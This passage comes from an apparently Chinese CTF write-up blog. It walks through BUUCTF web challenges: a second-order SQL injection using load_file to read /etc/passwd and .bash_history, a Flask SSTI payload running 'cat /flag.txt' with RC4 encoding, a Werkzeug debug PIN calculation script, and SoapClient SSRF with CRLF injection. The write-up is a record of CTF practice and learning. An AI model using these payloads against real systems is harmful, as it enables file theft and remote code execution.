&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>代码还是比较容易理解的，<del>其实审了好久</del></p>
<p>分为两块内容</p>
<ol>
<li><p>write</p>
<p>category 、content  、bo_id 经过 addslashes 转义后写入到数据库的 board 表中</p>
</li>
<li><p>comment</p>
<p>将 category 、content  、bo_id 写入到数据库的 comment 表中，不过在这一模块中只有 content  、bo_id是经过 addslashes 转义 的，而 category 则是从数据库的board表中读取我们在 write 模块中输入的内容，并没有经过 addslashes 转义</p>
</li>
</ol>
<p>通过审计可以发现存在二次注入</p>
<p>因为comment模块的 category 是我们在write模块写入的内容，而comment 却只显示 content 内容 （要注意虽然category 是经过 addslashes 转义后写入数据库的，但是取出时是没有被转义的，即没有反斜杠的），我们正是利用这一点进行的二次注入，</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">write</span>模块：title=<span class="number">1</span>&amp;category=<span class="string">&#x27;,content=(select load_file(&#x27;</span><span class="regexp">/etc/</span>passwd<span class="string">&#x27;)),/*&amp;content=111</span></span><br></pre></td></tr></table></figure>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">comment模块： $sql = &quot;<span class="keyword">insert</span> <span class="keyword">into</span> comment</span><br><span class="line">                <span class="keyword">set</span> category = <span class="string">&#x27;&#x27;</span>,content=(<span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)),<span class="comment">/*&#x27;,</span></span><br><span class="line"><span class="comment">                content = &#x27;*/</span>#<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;</span>$bo_id<span class="string">&#x27;&quot;;</span></span><br></pre></td></tr></table></figure>
<p>注入原理如上  /**/是多行注释符   ， # 是单行注释符 </p>
<p>在提交留言的时候，提交<code>*/#</code>，这样就成功闭合了，而且将回显的内容放到了content（这里的content是 我们在write模块中写入的category中的content ）里，实现了注入。</p>
<p><del>经过漫长的爆库、报表、爆字段，结果发现flag不在数据库里…</del>正确做法如下：</p>
<p>1.读取一下<code>/etx/passwd</code>  payload: <code>&#39;,content=(select load_file(&#39;/etc/passwd&#39;)),/*</code> 得到了www的用户目录。</p>
<p><img src="http://img.npfs06.top/20210413232740.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">www:</span><span class="symbol">x:</span><span class="number">500</span><span class="symbol">:</span><span class="number">500</span><span class="symbol">:www</span><span class="symbol">:/home/www</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>


<p><img src="http://img.npfs06.top/20210413232830.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们可以看到 www用户可以登录bash，www为普通用户，家目录为/home/www</p>
<ol start="2">
<li>.bash_history文件保存了当前用户使用过的历史命令。我们读取下这个文件 payload :<code>‘,content=(select load_file(‘//home/www/.bash_history’)),/*</code> 看用户的<strong>命令记录</strong></li>
</ol>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/tmp/</span> unzip html.zip rm -f html.zip cp -r html <span class="regexp">/var/</span>www<span class="regexp">/ cd /</span>var<span class="regexp">/www/</span>html/ rm -f .DS_Store service apache2 start</span><br></pre></td></tr></table></figure>
<p>首先是cd到了/tmp/目录，然后unzip了html.zip，然后又把这个.zip文件删除了。然后又把解压得到的html这个文件夹复制到了/var/www/下面，然后又cd到了/var/www/html下，将.DS_Store给删除，然后开启apache2服务。</p>
<p>(这里删除的是/var/www/html下的.DS_Store，而/tmp/html下的.DS_Store没有被删除)</p>
<p>3.读取 /tmp/html下的.DS_Store 。payload: <code>&#39;, content=(select load_file(&#39;/tmp/html/.DS_Store&#39;)),/*</code></p>
<p>这里的话，又是一个知识点，按照上面这个payload我们发现是没有回显的，这个时候我们需要进行hex编码</p>
<ol start="4">
<li>payload：<code>&#39;, content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></li>
</ol>
<p><img src="https://img.npfs06.top/20210413232854.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>发现文件 flag_8946e1ff1ee3e40f.php</p>
<p>5.这里又是一个坑，我们要读取这个文件不能在/tmp目录下，而是要回到/var/www/html</p>
<p>最终payload :<code>&#39;, content=(select (load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p>
<p>最后一个坑，查看源码获得flag</p>
<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>知识点：</p>
<ol>
<li>flask模板注入</li>
<li>RC4 加解密</li>
<li>PIN码</li>
</ol>
<p>解法一：</p>
<blockquote>
<p>Welcome To Find Secret</p>
</blockquote>
<p>访问 <a href="http://url/secret">http://url/secret</a></p>
<blockquote>
<p>Tell me your secret.I will encrypt it so others can’t see</p>
</blockquote>
<p>访问 <a href="http://url/secret/?secret=">http://url/secret/?secret=</a></p>
<p>输个大一点的secret值时，发现报错  比如?secret=11111</p>
<p>这个页面是flask应用开启了调试模式后运行错误的表现</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu10.jpg"></p>
<p>这段代码的意思是不存在变量secret时，返回Tell me your secret.I will encrypt it so others can’t see</p>
<p>否则对secret的值进行RC4加密，密钥为HereIsTreasure，再经由过程<code>render_template_string</code>履行</p>
<p>想到SSTI模板注入</p>
<p>注意下，这里的ciscn起过滤作用，只不过在buuctf的flag中没有ciscn字样所以该过滤没有起应有的作用</p>
<p><strong>这里我们需要对 RC4加密由一个大致的了解，RC4加密算法为对称加密算法，即明文经加密后得到密文，密文经加密后得到明文，就比如在这个页面  ?secret=1页面返回d  , 而  ?secret=d页面返回1</strong></p>
<p>对RC4加解密更详细的了解可以参考<a href="https://kabeor.cn/RC4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/#1-%E5%88%9D%E5%A7%8B%E5%8C%96" target="_blank">RC4加密算法及逆向方法初探</a></p>
<p>我们可以对poc 进行 RC4加密，加密脚本网上很多</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_message</span>():</span></span><br><span class="line">    print(<span class="string">&quot;输入你的信息：&quot;</span>)</span><br><span class="line">    s = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>():</span></span><br><span class="line">    print(<span class="string">&quot;输入你的秘钥：&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> key == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        key = <span class="string">&#x27;none_public_key&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_box</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    S盒</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) <span class="comment">#我这里没管秘钥小于256的情况，小于256应该不断重复填充即可</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment">#print(type(s_box)) #for_test</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ex_encrypt</span>(<span class="params">plain,box,mode</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    利用PRGA生成秘钥流并与密文字节异或，加解密同一个算法</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            c_mode = <span class="built_in">input</span>(<span class="string">&quot;输入你的解密模式:Base64 or ordinary\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> c_mode == <span class="string">&#x27;Base64&#x27;</span>:</span><br><span class="line">                plain = base64.b64decode(plain)</span><br><span class="line">                plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> c_mode == <span class="string">&#x27;ordinary&#x27;</span>:</span><br><span class="line">                plain = plain</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&quot;Something Wrong,请重新新输入&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    res = []</span><br><span class="line">    i = j =<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) %<span class="number">256</span></span><br><span class="line">        j = (j + box[i]) %<span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j])% <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s)^k))</span><br><span class="line"></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="comment">#print(cipher)</span></span><br><span class="line">    <span class="keyword">if</span>  mode == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="comment"># 化成可视字符需要编码</span></span><br><span class="line">        print(<span class="string">&quot;加密后的输出(没经过任何编码):&quot;</span>)</span><br><span class="line">        print(cipher)</span><br><span class="line">        print(<span class="string">&quot;url编码后：&quot;</span>)</span><br><span class="line">        print(parse.quote(cipher))</span><br><span class="line">        <span class="comment"># base64的目的也是为了变成可见字符</span></span><br><span class="line">        print(<span class="string">&quot;base64后的编码:&quot;</span>)</span><br><span class="line">        print(<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;解密后的密文：&quot;</span>)</span><br><span class="line">        print(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mode</span>():</span></span><br><span class="line">    print(<span class="string">&quot;请选择加密或者解密&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;1. Encrypt&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;2. Decode&quot;</span>)</span><br><span class="line">    mode = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        message = get_message()</span><br><span class="line">        key = get_key()</span><br><span class="line">        box = init_box(key)</span><br><span class="line">        ex_encrypt(message,box,mode)</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        message = get_message()</span><br><span class="line">        key = get_key()</span><br><span class="line">        box = init_box(key)</span><br><span class="line">        ex_encrypt(message, box, mode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;输入有误！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        get_mode()</span><br></pre></td></tr></table></figure>


<p><strong>不过这里poc的生成还可以使用cyberchef工具，并不一定要写脚本</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu11.jpg"></p>
<p>payload:</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">////我们需要的是经RC4加密后再经过url编码过的（因为RC4加密后有不可见字符，所有进行url编码）</span></span><br><span class="line">.%14bh%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%91U%27%C2%B2m%C3%9F%3C5%C2%AE%2B%C2%9CP%C3%8F%3E%C3%A6%3E%C2%98H%C3%857%C3%8E%60%C2%AD%40%C2%8F%C3%94%C3%9F%231%C2%82%13%C2%AB%C2%B4RS%5D%C3%90mS%C2%A88D%C3%8B%C3%BE%01V%C3%B7%C2%95%15%C2%A9v%05%03%0A%C3%92%08%C3%A4%06%C3%A2i%C2%9AdM78V%C2%B0%C3%A9%1C%C2%85%C2%8D%C3%A1%C3%82%C3%B8%C2%80%C3%AAgu%C3%90%C3%85%C2%8D%C2%88%C3%A6wV%C3%A8%C2%96A%C2%BB%1D%1C%5D%C3%9A%C2%96%0D%7Ek%5Cj%C3%8C%C3%AD%C2%95j8%C2%AF%22%17U%C2%9Ef%C2%9C%08%C2%85%C3%96%C3%AB3%C3%AA%C3%A4%1C%27%C3%B8%C3%9A.%C2%87%24%04%11p%C3%87%C2%92</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>解法二：</p>
<p>前面的做法同解法一，从<a href="http://url/secret?secret=11111">http://url/secret?secret=11111</a> 页面开始</p>
<p><strong>这个页面是flask应用开启了调试模式后运行错误的表现，在较旧版本的flask中可以直接在这个页面中打开python控制台运行代码，而在较新的版本中的flask中要打开python控制台需要输入一个pin码</strong>，如下：</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu12.jpg"></p>
<p><strong>pin码会在服务器端运行flask应用时输出，其格式为“ xxx-xxx-xxx”，其中x为任意一个数字，表示pin有10亿种组合。作为攻击者，我们目前是不知道pin编码的，除非你有耐性进行爆破，实际上爆破也是可行的，因为在固定的机器上，pin码是固定的</strong></p>
<p><strong>计算PIN码流程</strong>      <a href="https://xz.aliyun.com/t/2553" target="_blank">Flask debug pin安全问题</a></p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">需要六个数据来计算PIN码</span><br><span class="line"><span class="number">1</span>.username，读<span class="regexp">/etc/</span>passwd,本题为glzjin</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.module name 一般固定为flask.app</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.getattr(app, <span class="string">&quot;\_\_name\_\_&quot;</span>, app.\_\_class\_\_.\_\_name\_\_)的结果。就是Flask</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.flask库下app.py的绝对路径，不是当前运行的app.py的路径，在debug模式下报错就能直接看见，该题为<span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python2.<span class="number">7</span><span class="regexp">/site-packages/</span>flask/app.pyc</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.当前网络的mac地址的十进制数。通过文件<span class="regexp">/sys/</span><span class="keyword">class</span><span class="regexp">/net/</span>eth0/address读取，eth0为当前使用的网卡，如果有多个网卡数字可能会变，</span><br><span class="line"><span class="string">&#x27;class&#x27;</span> is not allowed. Secret is <span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">10</span>:a6:<span class="number">56</span>  </span><br><span class="line">这里为<span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">10</span>:a6:<span class="number">56</span> ，</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">print</span>(<span class="number">0</span>x0242ac10a656)</span><br><span class="line"><span class="number">2485377869398</span></span><br><span class="line">转十进制为 <span class="number">2485377869398</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.机器的id</span><br><span class="line">对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在<span class="regexp">/etc/m</span>achine-id或<span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>random<span class="regexp">/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取/</span>proc<span class="regexp">/self/</span>cgroup，序列号为<span class="number">1</span>那行</span><br><span class="line"><span class="number">1</span>:name=systemd:<span class="regexp">/docker/</span><span class="number">73</span>e631540828d92c2d71a634670c201fa81ff3ea9790ce454d630df7d27e994e</span><br></pre></td></tr></table></figure>
<p>至此，所有参数获取完毕，输入有效载荷计算密码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;glzjin&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python2.7/site-packages/flask/app.pyc&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377869398&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;73e631540828d92c2d71a634670c201fa81ff3ea9790ce454d630df7d27e994e&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//PIN  <span class="number">111</span>-070-<span class="number">424</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu13.jpg"></p>
<p> [GYCTF2020]FlaskApp 同意可以用求PIN的方法求flag</p>
<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>php内置类SoapClient</strong></li>
<li><strong>CRLF Injection漏洞</strong></li>
<li><strong>call_user_func</strong></li>
<li><strong>PHPsession 反序列化</strong></li>
</ol>
<p><strong>一. SoapClient</strong></p>
<p><strong>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</strong><br><strong>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu14.jpg"></p>
<p>第一个参数的意思是：控制是否是wsdl模式，如果为NULL，就是非wsdl模式.如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，第二个参数的意思是：一个数组，里面是soap请求的一些参数和属性。</p>
<p><strong>简单的用法</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(location<span class="string">&#x27;=&gt;&#x27;</span>http:<span class="comment">//example.com:2333&#x27;,&#x27;uri&#x27;=&gt;&#x27;123&#x27;));</span></span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;a();</span><br></pre></td></tr></table></figure>


<p>可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> （当调用对象中不存在的方法会自动调用此方法）方法来进行 <strong>SSRF</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu15.jpg"></p>
<p><strong>二. CRLF Injection漏洞</strong></p>
<p><strong>首先要对HTTPheaders 和 HTTPbody 要有一些基本的了解，如图，它们之前用空行区分</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu16.png"></p>
<p><strong>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</strong><br><strong>简单来说</strong><br><strong>http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://localhost:2333&quot;</span>;</span><br><span class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;location&quot;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&quot;user_agent&quot;</span> =&gt; <span class="string">&quot;mochazz\r\nCookie: PHPSESSID=123123\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uri&quot;</span> =&gt; <span class="string">&quot;demo&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$attack</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="variable">$options</span>);</span><br><span class="line"><span class="variable">$payload</span> = serialize(<span class="variable">$attack</span>);</span><br><span class="line">unserialize(<span class="variable">$payload</span>)-&gt;ff(); <span class="comment">// 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到如下</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">→/home nc - lvp 2333</span><br><span class="line">listening on [any] 2333</span><br><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 42022</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost :2333</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line">User -Agent: mochazz</span><br><span class="line">Cookie: PHPSESSID= 123123    </span><br><span class="line"></span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;demo#a&quot;</span><br><span class="line">Content-Length: 365</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;S0AP- ENV:Envelope xmlns: S0AP- ENV= &quot;http:/ /schemas . xmlsoap . org/ soap/envelope/&quot; xmlns:ns1=&quot;demo&quot; xmIns :xsd=&quot;http:/ /www .w3.org/</span><br><span class="line">2001/XMLSchema&quot; xmIns : SOAP -ENC=&quot;http://schemas .xmlsoap .or g/soap/ encoding/&quot; SOAP- ENV:encodingStyle=&quot;http://schemas .xmlsoap.og/ soap/ encoding/&quot;&gt;&lt;S0AP - ENV : Body&gt;&lt;ns1 :a/&gt;&lt;/S0AP - ENV: Body&gt;&lt;/S0AP ENV: Envelope&gt;</span><br></pre></td></tr></table></figure>


<p> <strong>三. call_user_func</strong> </p>
<p> <strong>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</strong></p>
<p>先传入extract()，将$b覆盖成回调函数，这样题目中的 <strong>call_user_func($b,$a)</strong> 就可以变成 <strong>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</strong> ，即调用 <strong>SoapClient</strong> 类不存在的 <strong>welcome_to_the_lctf2018</strong> 方法，从而触发 <strong>__call</strong> 方法发起 <strong>soap</strong> 请求进行 <strong>SSRF</strong> 。</p>
<p>四. PHPsession 反序列化</p>
<table>
<thead>
<tr>
<th>Directive</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>session.save_handler</td>
<td>session保存形式。默认为files</td>
</tr>
<tr>
<td>session.save_path</td>
<td>session保存路径。</td>
</tr>
<tr>
<td>session.serialize_handler</td>
<td>session序列化存储所用处理器。默认为php。</td>
</tr>
<tr>
<td>session.upload_progress.cleanup</td>
<td>一旦读取了所有POST数据，立即清除进度信息。默认开启</td>
</tr>
<tr>
<td>session.upload_progress.enabled</td>
<td>将上传文件的进度信息存在session中。默认开启。</td>
</tr>
</tbody></table>
<p>我们先通过一个样例代码，看看3种不同的 <strong>session</strong> 序列化处理器处理 <strong>session</strong> 的情况。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;mochazz&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当 <strong>session.serialize_handler=php</strong> 时，session文件内容为： <code>name|s:7:&quot;mochazz&quot;;</code></p>
<p>当 <strong>session.serialize_handler=php_serialize</strong> 时，session文件为： <code>a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;mochazz&quot;;&#125;</code></p>
<p>当 <strong>session.serialize_handler=php_binary</strong> 时，session文件内容为： <code>二进制字符names:7:&quot;mochazz&quot;;</code></p>
